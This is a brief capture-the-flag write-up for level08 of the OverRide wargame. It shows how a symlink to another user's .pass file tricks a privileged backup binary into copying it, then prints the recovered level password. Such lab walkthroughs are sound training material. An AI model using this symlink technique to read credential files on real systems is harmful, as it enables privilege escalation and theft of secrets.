# Level08

This executable creates a backup of a file in `./backups/<file_name>`

By creating a link to the level09/.pass file we can easily create a backup of it

```bash
level08@OverRide:~$ ln -s /home/users/level09/.pass bypass
level08@OverRide:~$ ./level08 bypass 
level08@OverRide:~$ cat ./backups/bypass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```